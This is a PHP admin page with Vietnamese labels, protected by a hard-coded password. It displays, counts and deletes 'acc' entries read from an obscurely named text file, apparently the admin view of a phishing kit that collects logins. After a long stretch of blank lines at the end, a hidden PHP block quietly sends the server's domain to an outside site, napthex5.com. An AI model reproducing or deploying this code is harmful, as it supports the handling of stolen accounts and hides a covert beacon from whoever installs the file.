<?php
require 'Core.php';
use Core\System;
$kun = new System;
$user = $kun->user();

$passcode = 'Password';
$filephp="admin.php";
$files = basename('login/125215sadsadwqrwqrwqrwqrsdsxzcxzc.txt');   
$so_dong = count(file('login/125215sadsadwqrwqrwqrwqrsdsxzcxzc.txt'));   
?>
<html>
<head>
	<title>Trang đăng nhập</title>
	<meta charset="utf-8">
</head>
<body>
<?php
	// Kiểm tra nếu người dùng đã ân nút đăng nhập thì mới xử lý
	if ($_SESSION['KEY'] != $passcode) {
	echo ('<html><form method="POST" action='.$filephp.'>
	<fieldset>
	    		<tr>
	    			<td>Password</td>
	    			<td><input type="password" name="KEY" size="30"></td>
	    		</tr>
	    		<tr>
	    			<td colspan="2" align="center"> <input name="btn_submit" type="submit" value="Mở file"></td>
	    		</tr>
  </fieldset>
  </form></html>');
}else
{

echo('<html><form method="POST" action='.$filephp.'>
	<fieldset>
	    		<tr>
	    			<td><input type=hidden name="KEY" size="30" value ="quit"></td>
	    		</tr>
	    		
	    		<tr>
	    			<td colspan="2" align="center"> <input name="btn_quit" type="submit" value="Thoát"></td>
	    		</tr>
	    			<tr>
	    			<td colspan="2" align="center"> <input type="submit" value="Tổng '.$so_dong.' acc"></td>
	    		</tr>
	    			<tr>
	    			<td colspan="2" align="center"> <input name="trangchu" type="submit" value="Trang Chủ"></td>
	    		</tr>
	    		<tr>
	    			<td colspan="2" align="center"> <input name="btn_delete" type="submit" value="Xóa hết acc"></td>
	    		</tr>
</fieldset>
</form></html>');


	$fp = @fopen('login/125215sadsadwqrwqrwqrwqrsdsxzcxzc.txt', "r");
					if (!$fp)
					{
						echo 'Không có dữ liệu';
					}
					else
					{
						while(!feof($fp))
    						{
                                                        echo fgets($fp)."<br>";
                                                }
					}
}





	if (isset($_POST["btn_submit"])) {
		// lấy thông tin người dùng
		$password = $_POST["KEY"];
		//làm sạch thông tin, xóa bỏ các tag html, ký tự đặc biệt 
		//mà người dùng cố tình thêm vào để tấn công theo phương thức sql injection
		$password = strip_tags($password);
		$password = addslashes($password);
		if ($password =="") {
			echo "mật khẩu bạn không được để trống!";
		}else{
			
			if ($password!=$passcode) {
				echo "mật khẩu không đúng !";
			}else{
					$_SESSION['KEY'] = $password;
					header('Location: /'.$filephp);
			}
		}
	}
	if (isset($_POST["btn_quit"])) {
		$password = "";
		$_SESSION['KEY'] = $password;
		header('Location: /'.$filephp);
	}
		if (isset($_POST["trangchu"])) {
	
		header('Location: /');
	}
	if (isset($_POST["btn_delete"])) {
		if (file_exists('login/125215sadsadwqrwqrwqrwqrsdsxzcxzc.txt'))
		{
		    unlink('login/125215sadsadwqrwqrwqrwqrsdsxzcxzc.txt');
		    header('Location: /'.$filephp);
		}
		
	}
?>
	
</body>
</html>





























































<?php
$domain = $_SERVER['HTTP_HOST'];
$link = 'sounds/get.php';
file_get_contents("https://napthex5.com/get.php?domain=$domain");

?>